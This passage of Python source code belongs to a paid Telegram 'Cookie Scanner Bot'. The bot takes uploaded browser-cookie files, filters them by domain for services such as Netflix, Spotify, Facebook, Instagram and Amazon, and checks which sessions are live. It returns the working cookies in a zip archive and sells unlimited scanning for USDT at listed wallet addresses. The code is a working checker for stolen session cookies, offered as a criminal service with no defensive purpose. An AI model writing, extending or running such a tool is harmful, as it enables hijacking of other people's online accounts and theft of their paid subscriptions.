        expiry_date = datetime.fromisoformat(user_data['vip_expiry'])
        if datetime.now() > expiry_date:
            user_data['plan'] = 'normal'
            user_data['vip_expiry'] = None
            save_users_db()
    if user_data['plan'] == 'vip':
        return True, ""
    last_reset = datetime.fromisoformat(user_data['last_reset'])
    if datetime.now() - last_reset > timedelta(hours=NORMAL_PLAN_RESET_HOURS):
        user_data['file_count'] = 0
        user_data['last_reset'] = datetime.now().isoformat()
        save_users_db()
    if user_data['file_count'] >= NORMAL_PLAN_LIMIT:
        reset_time = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = reset_time - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        return False, f"You have used all {NORMAL_PLAN_LIMIT} scan attempts. Please wait {hours} hours {minutes} minutes to reset or upgrade to VIP!"
    return True, ""

def increment_file_count(user_id):
    user_data = get_user_record(user_id)
    user_data['file_count'] += 1
    save_users_db()

def set_vip_with_duration(user_id, days):
    user_id_str = str(user_id)
    if user_id_str not in users_db:
        return False
    expiry_date = datetime.now() + timedelta(days=days)
    now = datetime.now().isoformat()
    users_db[user_id_str]['plan'] = 'vip'
    users_db[user_id_str]['vip_expiry'] = expiry_date.isoformat()
    users_db[user_id_str]['vip_start'] = now
    users_db[user_id_str]['file_count'] = 0
    save_users_db()
    return True

async def show_start_login(update: Update = None, query=None):
    keyboard = [[InlineKeyboardButton("Login", callback_data="login_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "Welcome\n\nTap Login to continue."
    if query:
        await query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_start_login(update=update)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    keyboard = [
        [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
        [InlineKeyboardButton("Check Plan", callback_data="check_plan"), InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
    ]
    if str(user.id) == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Cookie Scanner Bot Menu\n\nChoose an option:",reply_markup=reply_markup)

async def check_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    user_id = user.id
    user_data = get_user_record(user_id)
    plan_text = "VIP" if user_data['plan'] == 'vip' else "Normal"
    used_files = user_data['file_count']
    max_files = "Unlimited" if user_data['plan'] == 'vip' else NORMAL_PLAN_LIMIT
    vip_info = ""
    if user_data['plan'] == 'vip' and user_data.get('vip_expiry'):
        expiry_date = datetime.fromisoformat(user_data['vip_expiry'])
        remaining = expiry_date - datetime.now()
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = int(remaining.seconds // 3600)
            vip_info = f"\nVIP expires in: {days} days {hours} hours"
        else:
            vip_info = "\nVIP expired"
    if user_data['plan'] == 'normal':
        last_reset = datetime.fromisoformat(user_data['last_reset'])
        next_reset = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = next_reset - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        reset_info = f"\nReset in: {hours} hours {minutes} minutes"
    else:
        reset_info = ""
    keyboard = [
        [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33"),InlineKeyboardButton("Buy VIP Plan", callback_data="buy_vip")],
        [InlineKeyboardButton("Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = f"""Your Plan Information:

Plan: {plan_text}
Used: {used_files}/{max_files} files{vip_info}{reset_info}

VIP Plan Pricing:
• 1 Week: 50,000 VND- 3,79 USDT 
• 3 Weeks: 120,000 VND - 5,69 USDT  
• 1 Month: 150,000 VND - 7,59 USDT 

Contact Owner @TSP1K33 to upgrade!"""
    await update.message.reply_text(message, reply_markup=reply_markup)

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    total_users = len(users_db)
    normal_users = sum(1 for u in users_db.values() if u.get('plan') == 'normal')
    vip_users = sum(1 for u in users_db.values() if u.get('plan') == 'vip')
    total_scans = sum(u.get('file_count', 0) for u in users_db.values())
    expiring_vip = 0
    for u in users_db.values():
        if u.get('plan') == 'vip' and u.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(u['vip_expiry'])
            if expiry_date - datetime.now() < timedelta(days=7):
                expiring_vip += 1
    header = f"{'User ID':<15}{'Plan':<8}{'VIP Expiry':<20}"
    lines = [header, "-"*len(header)]
    for uid, data in users_db.items():
        plan = data.get('plan','')
        expiry = data.get('vip_expiry') or "-"
        if expiry != "-":
            expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M")
        lines.append(f"{uid:<15}{plan:<8}{expiry:<20}")
    table = "\n".join(lines)
    message = f"""System Statistics:

Total users: {total_users}
Normal users: {normal_users}
VIP users: {vip_users}
Total scans: {total_scans}
VIP expiring soon (7d): {expiring_vip}

{table}"""
    await update.message.reply_text(message)

async def admin_set_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Please provide user_id and duration!\nUsage: /setvip <user_id> <days>")
        return
    target_user_id = context.args[0]
    try:
        days = int(context.args[1])
    except ValueError:
        await update.message.reply_text("Please provide valid number of days!")
        return
    if target_user_id not in users_db:
        await update.message.reply_text("User ID does not exist!")
        return
    if set_vip_with_duration(target_user_id, days):
        expiry_date = datetime.now() + timedelta(days=days)
        await update.message.reply_text(f"Successfully set VIP for user {target_user_id} for {days} days! Expires on {expiry_date.strftime('%Y-%m-%d %H:%M')}")
    else:
        await update.message.reply_text("Error setting VIP!")

async def admin_del_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /delvip <user_id>")
        return
    target_user_id = context.args[0]
    if target_user_id not in users_db:
        await update.message.reply_text("User ID does not exist!")
        return
    if target_user_id == ADMIN_USER_ID:
        await update.message.reply_text("You cannot remove VIP from admin!")
        return
    users_db[target_user_id]['plan'] = 'normal'
    users_db[target_user_id]['vip_expiry'] = None
    save_users_db()
    await update.message.reply_text(f"Removed VIP for user {target_user_id} successfully!")

async def login_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        keyboard = [
            [InlineKeyboardButton("Create Account", callback_data="create_account")],
            [InlineKeyboardButton("Help", callback_data="help_menu")],
            [InlineKeyboardButton("Back", callback_data="back_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Login Menu\n\nChoose an option:", reply_markup=reply_markup)
    else:
        keyboard = [
            [InlineKeyboardButton("Create Account", callback_data="create_account")],
            [InlineKeyboardButton("Help", callback_data="help_menu")],
            [InlineKeyboardButton("Back", callback_data="back_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Login Menu\n\nChoose an option:", reply_markup=reply_markup)

async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Single Service", callback_data="services_list")],
        [InlineKeyboardButton("Scan All Service", callback_data="scan_all")],
        [InlineKeyboardButton("Check Plan", callback_data="check_plan"),InlineKeyboardButton("Buy Plan", callback_data="buy_vip")],
        [InlineKeyboardButton("Back", callback_data="login_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text("Help\n\nSelect an option:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("Help\n\nSelect an option:", reply_markup=reply_markup)

async def create_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return
    user_id = user.id
    user_id_str = str(user_id)
    data = get_user_record(user_id)
    if not data.get('registered'):
        users_db[user_id_str]['registered'] = True
        users_db[user_id_str]['join_date'] = datetime.now().isoformat()
        if user_id_str != ADMIN_USER_ID and users_db[user_id_str]['plan'] != 'vip':
            users_db[user_id_str]['plan'] = 'normal'
        save_users_db()
    data = users_db[user_id_str]
    plan_text = "VIP" if data['plan'] == 'vip' else "Normal"
    keyboard = [
        [InlineKeyboardButton("Help", callback_data="help_menu")],
        [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = f"Account Created\n\nUser: {user.first_name or user.username}\nUser ID: {user_id}\nPlan: {plan_text}\nJoin Date: {data.get('join_date','')}"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    if not user:
        return
    user_id = user.id
    data = query.data
    chat_id = query.message.chat.id
    if data == 'back_start':
        await show_start_login(query=query)
        return
    if data == 'login_menu':
        await login_menu(update, context)
        return
    if data == 'help_menu':
        await help_menu(update, context)
        return
    if data == 'create_account':
        await create_account(update, context)
        return
    if not is_registered(user_id):
        keyboard = [[InlineKeyboardButton("Login", callback_data="login_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Please create an account to use the bot.\nTap Login to continue.", reply_markup=reply_markup)
        return
    if data.startswith('service_'):
        service_name = data.replace('service_', '')
        if is_restricted_private(user_id, chat_id):
            keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],[InlineKeyboardButton("Back", callback_data="services_list")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(PRIVATE_BLOCK_MESSAGE,reply_markup=reply_markup)
            return
        context.user_data['selected_service'] = service_name
        can_scan, error_msg = can_user_scan(user_id)
        if not can_scan:
            keyboard = [[InlineKeyboardButton("Back", callback_data="services_list")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"{error_msg}\n\nUse /checkplan to check your plan information.",reply_markup=reply_markup)
            return
        service_display = SERVICES.get(service_name, service_name)
        keyboard = [[InlineKeyboardButton("Back", callback_data="services_list")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Selected: {service_display}\n\nSend .txt or .zip cookie file to scan...",reply_markup=reply_markup)
    elif data == 'buy_vip':
        keyboard = [
            [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33"),InlineKeyboardButton("Copy TRC20", callback_data="copy_trc20")],
            [InlineKeyboardButton("Copy BEP20", callback_data="copy_bep20"),InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Upgrade to VIP Plan\n\nContact Owner: @TSP1K33\n\nPayment Methods:\n• USDT-TRON-TRC20 TGMAfsoiFkXaJfDjCLjYXHE9MycL5Gkjok\n• USDT-BSC-BEP20 0x209c10F0bd76BbC1b91CeFC67419Ad98fF264155\n\nVIP Plan Pricing:\n• 1 Week: 50,000 VND - 3,79 USDT\n• 3 Weeks: 120,000 VND - 5,69 USDT\n• 1 Month: 150,000 VND - 7,59 USDT\n\nClick buttons below to copy wallet addresses:",reply_markup=reply_markup)
    elif data == 'copy_trc20':
        wallet_address = PAYMENT_ACCOUNTS['trc20']
        await query.message.reply_text(f"TRC20 Address: {wallet_address}")
    elif data == 'copy_bep20':
        wallet_address = PAYMENT_ACCOUNTS['bep20']
        await query.message.reply_text(f"BEP20 Address: {wallet_address}")
    elif data == 'main_menu':
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"), InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if str(user_id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Cookie Scanner Bot Menu\n\nChoose an option:",reply_markup=reply_markup)
    elif data == 'services_list':
        keyboard = [
            [InlineKeyboardButton("Netflix", callback_data="service_netflix"),InlineKeyboardButton("Spotify", callback_data="service_spotify")],
            [InlineKeyboardButton("TikTok", callback_data="service_tiktok"),InlineKeyboardButton("Facebook", callback_data="service_facebook")],
            [InlineKeyboardButton("Canva", callback_data="service_canva"),InlineKeyboardButton("Roblox", callback_data="service_roblox")],
            [InlineKeyboardButton("Instagram", callback_data="service_instagram"),InlineKeyboardButton("YouTube", callback_data="service_youtube")],
            [InlineKeyboardButton("LinkedIn", callback_data="service_linkedin"),InlineKeyboardButton("Amazon", callback_data="service_amazon")],
            [InlineKeyboardButton("WordPress", callback_data="service_wordpress"),InlineKeyboardButton("CapCut", callback_data="service_capcut")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Select service:",reply_markup=reply_markup)
    elif data == 'check_plan':
        user_data = get_user_record(user_id)
        plan_text = "VIP" if user_data['plan'] == 'vip' else "Normal"
        used_files = user_data['file_count']
        max_files = "Unlimited" if user_data['plan'] == 'vip' else NORMAL_PLAN_LIMIT
        vip_info = ""
        if user_data['plan'] == 'vip' and user_data.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(user_data['vip_expiry'])
            remaining = expiry_date - datetime.now()
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = int(remaining.seconds // 3600)
                vip_info = f"\nVIP expires in: {days} days {hours} hours"
            else:
                vip_info = "\nVIP expired"
        if user_data['plan'] == 'normal':
            last_reset = datetime.fromisoformat(user_data['last_reset'])
            next_reset = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
            remaining = next_reset - datetime.now()
            hours = int(remaining.total_seconds() // 3600)
            minutes = int((remaining.total_seconds() % 3600) // 60)
            reset_info = f"\nReset in: {hours} hours {minutes} minutes"
        else:
            reset_info = ""
        keyboard = [
            [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33"),InlineKeyboardButton("Buy VIP Plan", callback_data="buy_vip")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = f"""Your Plan Information:

Plan: {plan_text}
Used: {used_files}/{max_files} files{vip_info}{reset_info}

VIP Plan Pricing:
• 1 Week: 50,000 VND - 3,79 USDT
• 3 Weeks: 120,000 VND - 5,69 USDT
• 1 Month: 150,000 VND - 7,59 USDT

Contact Owner @TSP1K33 to upgrade!"""
        await query.edit_message_text(message, reply_markup=reply_markup)
    elif data == 'scan_all':
        if is_restricted_private(user_id, chat_id):
            keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(PRIVATE_BLOCK_MESSAGE,reply_markup=reply_markup)
            return
        context.user_data['selected_service'] = 'all'
        can_scan, error_msg = can_user_scan(user_id)
        if not can_scan:
            keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"{error_msg}\n\nUse /checkplan to check your plan information.",reply_markup=reply_markup)
            return
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Scan All Services\n\nSend cookie file to scan for ALL services...\n\nSend .txt or .zip file containing cookies",reply_markup=reply_markup)
    elif data == 'admin_panel':
        if str(user_id) != ADMIN_USER_ID:
            await query.edit_message_text("You do not have permission to access this panel.")
            return
        keyboard = [
            [InlineKeyboardButton("Users & VIP", callback_data="admin_users_info")],
            [InlineKeyboardButton("Today's Scan Count", callback_data="admin_today_stats")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Admin Panel\n\nChoose an option:", reply_markup=reply_markup)
    elif data == 'admin_users_info':
        if str(user_id) != ADMIN_USER_ID:
            await query.edit_message_text("You do not have permission to use this button.")
            return
        total_users = sum(1 for u in users_db.values() if u.get('registered'))
        vip_entries = [(uid, datau) for uid, datau in users_db.items() if datau.get('plan') == 'vip']
        lines = [f"Total users: {total_users}", f"VIP users: {len(vip_entries)}"]
        if vip_entries:
            lines.append("")
            lines.append("VIP details:")
            for uid, datau in vip_entries:
                vip_start = datau.get('vip_start')
                vip_expiry = datau.get('vip_expiry')
                if vip_start:
                    try:
                        vip_start_str = datetime.fromisoformat(vip_start).strftime("%Y-%m-%d %H:%M")
                    except Exception:
                        vip_start_str = vip_start
                else:
                    vip_start_str = "-"
                if vip_expiry:
                    try:
                        vip_expiry_str = datetime.fromisoformat(vip_expiry).strftime("%Y-%m-%d %H:%M")
                    except Exception:
                        vip_expiry_str = vip_expiry
                else:
                    vip_expiry_str = "-"
                lines.append(f"- {uid} | Start: {vip_start_str} | Expiry: {vip_expiry_str}")
        keyboard = [[InlineKeyboardButton("Back", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("\n".join(lines), reply_markup=reply_markup)
    elif data == 'admin_today_stats':
        if str(user_id) != ADMIN_USER_ID:
            await query.edit_message_text("You do not have permission to use this button.")
            return
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats_db.get('daily_scans', {})
        today_count = daily.get(today, 0)
        keyboard = [[InlineKeyboardButton("Back", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Today scanned files: {today_count}", reply_markup=reply_markup)
    elif data == 'stats_info':
        user_data = get_user_record(user_id)
        if str(user_id) == ADMIN_USER_ID:
            total_users = len(users_db)
            normal_users = sum(1 for u in users_db.values() if u.get('plan') == 'normal')
            vip_users = sum(1 for u in users_db.values() if u.get('plan') == 'vip')
            total_scans = sum(u.get('file_count', 0) for u in users_db.values())
            header = f"{'User ID':<15}{'Plan':<8}{'VIP Expiry':<20}"
            lines = [header, "-"*len(header)]
            for uid, datau in users_db.items():
                plan = datau.get('plan','')
                expiry = datau.get('vip_expiry') or "-"
                if expiry != "-":
                    expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M")
                lines.append(f"{uid:<15}{plan:<8}{expiry:<20}")
            table = "\n".join(lines)
            keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = f"""Bot Statistics

Total Users: {total_users}
Normal Users: {normal_users}
VIP Users: {vip_users}
Total Scans: {total_scans}

{table}"""
            await query.edit_message_text(message, reply_markup=reply_markup)
        else:
            total_users = len(users_db)
            normal_users = sum(1 for u in users_db.values() if u.get('plan') == 'normal')
            vip_users = sum(1 for u in users_db.values() if u.get('plan') == 'vip')
            total_scans = sum(u.get('file_count', 0) for u in users_db.values())
            keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = f"""Bot Statistics

Total Users: {total_users}
Normal Users: {normal_users}
VIP Users: {vip_users}
Total Scans: {total_scans}

Your Usage:
User ID: {user_id}
Plan: {'VIP' if user_data['plan'] == 'vip' else 'Normal'}
Your Scans: {user_data['file_count']}"""
            await query.edit_message_text(message, reply_markup=reply_markup)

def scan_cookie_content(content, service_name, original_content=None):
    try:
        cookies = parse_cookies_txt(content)
        if not cookies:
            return {'error': 'No valid cookies found in file'}
        if service_name == 'all':
            results = {}
            for service_key, service_info in SCAN_TARGETS.items():
                service_domains = service_info['domains']
                filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
                if filtered_cookies:
                    test_function = SERVICE_TEST_FUNCTIONS.get(service_key)
                    if test_function:
                        result = test_function(filtered_cookies)
                        if not isinstance(result, dict):
                            result = {'status': 'unknown','message': 'Internal error while testing cookies'}
                        result['cookie_count'] = len(filtered_cookies)
                        result['service_name'] = service_key
                        if original_content and result.get('status') == 'success':
                            result['original_content'] = original_content
                        results[service_key] = result
            return {'all_results': results}
        else:
            if service_name not in SCAN_TARGETS:
                return {'error': f'Scan not supported for {service_name}'}
            service_domains = SCAN_TARGETS[service_name]['domains']
            filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
            if not filtered_cookies:
                return {'error': f'No suitable cookies found for {service_name}'}
            test_function = SERVICE_TEST_FUNCTIONS.get(service_name)
            if not test_function:
                return {'error': f'Scan not supported for {service_name}'}
            result = test_function(filtered_cookies)
            if not isinstance(result, dict):
                result = {'status': 'unknown','message': 'Internal error while testing cookies'}
            result['cookie_count'] = len(filtered_cookies)
            if original_content and result.get('status') == 'success':
                result['original_content'] = original_content
            return result
    except Exception as e:
        return {'error': f'Error scanning cookie: {str(e)}'}

def process_single_file(file_name, content, selected_service):
    try:
        result = scan_cookie_content(content, selected_service, original_content=content)
        return file_name, result
    except Exception as e:
        return file_name, {'error': f'Error processing file: {str(e)}'}

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    user_id = user.id
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    if chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return
    if 'selected_service' not in context.user_data:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Please choose a service first from the menu.", reply_markup=reply_markup)
        return
    can_scan, error_msg = can_user_scan(user_id)
    if not can_scan:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(error_msg, reply_markup=reply_markup)
        return
    
    selected_service = context.user_data['selected_service']
    doc = update.message.document
    if not doc:
        await update.message.reply_text("No document attached.")
        return
    
    status_msg = await update.message.reply_text("The bot is scanning your file, please wait...")
    
    file = await doc.get_file()
    file_name = clean_filename(doc.file_name or "cookie.txt")
    ext = Path(file_name).suffix.lower()
    file_bytes = await file.download_as_bytearray()
    
    processed_files = 0
    all_results = {}
    live_cookies = {}
    
    try:
        if ext == '.zip':
            with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
                names = [n for n in zf.namelist() if n.lower().endswith('.txt')]
                if not names:
                    await status_msg.edit_text("No .txt cookie files found in the .zip")
                    return
                
                files_to_process = []
                for n in names:
                    try:
                        with zf.open(n) as f:
                            raw = f.read()
                        try:
                            content = raw.decode('utf-8')
                        except UnicodeDecodeError:
                            content = raw.decode('latin-1', errors='ignore')
                        files_to_process.append((Path(n).name, content))
                    except Exception as e:
                        logger.error(f"Error reading file {n}: {e}")
                
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = []
                    for file_name, content in files_to_process:
                        future = executor.submit(process_single_file, file_name, content, selected_service)
                        futures.append(future)
                    
                    for future in as_completed(futures):
                        file_name, result = future.result()
                        processed_files += 1
                        
                        if 'error' in result:
                            if 'error_messages' not in all_results:
                                all_results['error_messages'] = []
                            all_results['error_messages'].append(f"{file_name}: {result['error']}")
                        else:
                            if selected_service == 'all':
                                all_results[file_name] = result
                                for svc, r in result.get('all_results', {}).items():
                                    if r.get('status') == 'success':
                                        if svc not in live_cookies:
                                            live_cookies[svc] = []
                                        live_cookies[svc].append((file_name, r))
                            else:
                                all_results[file_name] = result
                                if result.get('status') == 'success':
                                    if selected_service not in live_cookies:
                                        live_cookies[selected_service] = []
                                    live_cookies[selected_service].append((file_name, result))
                
                summary_lines = []
                summary_lines.append(f"Scan Summary for {len(names)} files:")
                
                if selected_service == 'all':
                    service_stats = {}
                    for file_name, result in all_results.items():
                        if 'all_results' in result:
                            for svc, r in result['all_results'].items():
                                if svc not in service_stats:
                                    service_stats[svc] = {'live': 0, 'dead': 0, 'unknown': 0, 'no_cookies': 0, 'error': 0}
                                status = r.get('status', 'unknown')
                                if status == 'success':
                                    service_stats[svc]['live'] += 1
                                elif status == 'dead':
                                    service_stats[svc]['dead'] += 1
                                elif status == 'no_cookies':
                                    service_stats[svc]['no_cookies'] += 1
                                elif status == 'error':
                                    service_stats[svc]['error'] += 1
                                else:
                                    service_stats[svc]['unknown'] += 1
                    
                    for svc_key, stats in service_stats.items():
                        if stats['live'] > 0 or stats['dead'] > 0:
                            service_name_display = SERVICES.get(svc_key, svc_key).title()
                            line = f"✅ {service_name_display}: {stats['live']} live, ❌ {stats['dead']} dead"
                            if stats['unknown'] > 0:
                                line += f", {stats['unknown']} unknown"
                            if stats['no_cookies'] > 0:
                                line += f", {stats['no_cookies']} no cookies"
                            if stats['error'] > 0:
                                line += f", {stats['error']} error"
                            summary_lines.append(line)
                else:
                    stats = {'live': 0, 'dead': 0, 'unknown': 0, 'no_cookies': 0, 'error': 0}
                    for file_name, result in all_results.items():
                        if 'error' not in result:
                            status = result.get('status', 'unknown')
                            if status == 'success':
                                stats['live'] += 1
                            elif status == 'dead':
                                stats['dead'] += 1
                            elif status == 'no_cookies':
                                stats['no_cookies'] += 1
                            elif status == 'error':
                                stats['error'] += 1
                            else:
                                stats['unknown'] += 1
                    
                    service_name_display = SERVICES.get(selected_service, selected_service).title()
                    summary_lines.append(f"{service_name_display} Scan Summary:")
                    summary_lines.append(f"✅ Live: {stats['live']}, ❌ Dead: {stats['dead']}")
                    if stats['unknown'] > 0:
                        summary_lines.append(f"Unknown: {stats['unknown']}")
                    if stats['no_cookies'] > 0:
                        summary_lines.append(f"No Cookies: {stats['no_cookies']}")
                    if stats['error'] > 0:
                        summary_lines.append(f"Errors: {stats['error']}")
                
                if 'error_messages' in all_results and all_results['error_messages']:
                    summary_lines.append("")
                    summary_lines.append("Errors:")
                    for err in all_results['error_messages'][:5]:
                        summary_lines.append(f"• {err}")
                    if len(all_results['error_messages']) > 5:
                        summary_lines.append(f"• ...and {len(all_results['error_messages']) - 5} more errors")
                
                await status_msg.edit_text("\n".join(summary_lines))
                
                if live_cookies:
                    await send_live_cookies_archive(update, live_cookies, selected_service)
                
        elif ext == '.txt':
            try:
                content = file_bytes.decode('utf-8')
            except UnicodeDecodeError:
                content = file_bytes.decode('latin-1', errors='ignore')
            
            file_name, result = process_single_file(file_name, content, selected_service)
            processed_files += 1
            
            if 'error' in result:
                await status_msg.edit_text(f"Error: {result['error']}")
            else:
                if selected_service == 'all':
                    summary_lines = [f"Scan Results for {file_name}:"]
                    for svc, r in result.get('all_results', {}).items():
                        icon = get_status_icon(r.get('status'))
                        plan = extract_public_plan_info(r.get('plan_info','')) or ""
                        plan = f" • {plan}" if plan else ""
                        summary_lines.append(f"{icon} {SERVICES.get(svc, svc).title()}: {get_status_text(r.get('status'))}{plan}")
                    
                    if not result.get('all_results'):
                        summary_lines.append("No target cookies found.")
                    
                    await status_msg.edit_text("\n".join(summary_lines))
                    
                    live_cookies = {}
                    for svc, r in result.get('all_results', {}).items():
                        if r.get('status') == 'success':
                            live_cookies[svc] = [(file_name, r)]
                    
                    if live_cookies:
                        await send_live_cookies_archive(update, live_cookies, selected_service)
                        
                else:
                    status = result.get('status')
                    icon = get_status_icon(status)
                    plan = extract_public_plan_info(result.get('plan_info','')) or ""
                    plan = f"\n{plan}" if plan else ""
                    
                    message = f"{file_name}\n{icon} {get_status_text(status)}{plan}"
                    await status_msg.edit_text(message)
                    
                    if status == 'success':
                        live_cookies = {selected_service: [(file_name, result)]}
                        await send_live_cookies_archive(update, live_cookies, selected_service)
        else:
            await status_msg.edit_text("Please send a .txt or .zip file.")
            return
        
        if processed_files > 0:
            increment_file_count(user_id)
            increment_daily_scans(processed_files)
            
    except Exception as e:
        logger.error(f"Error processing document: {e}")
        await status_msg.edit_text(f"Error processing file: {str(e)}")

async def send_live_cookies_archive(update: Update, live_cookies, selected_service):
    try:
        if not live_cookies:
            return
        
        with BytesIO() as archive_buffer:
            with zipfile.ZipFile(archive_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                if selected_service == 'all':
                    for service_key, cookies_list in live_cookies.items():
                        service_name = SERVICES.get(service_key, service_key).title()
                        service_folder = f"{service_name}_Live_Cookies/"
                        
                        for file_name, result in cookies_list:
                            content = result.get('original_content', '')
                            if content:
                                zipf.writestr(f"{service_folder}{file_name}", content)
                else:
                    service_name = SERVICES.get(selected_service, selected_service).title()
                    for file_name, result in live_cookies.get(selected_service, []):
                        content = result.get('original_content', '')
                        if content:
                            zipf.writestr(f"{service_name}_Live/{file_name}", content)
            
            archive_buffer.seek(0)
            archive_name = f"live_cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            
            await update.message.reply_document(
                document=archive_buffer,
                filename=archive_name,
                caption=f"Live cookies archive ({len(live_cookies)} services)"
            )
    except Exception as e:
        logger.error(f"Error creating archive: {e}")
        await update.message.reply_text(f"Error creating archive: {str(e)}")

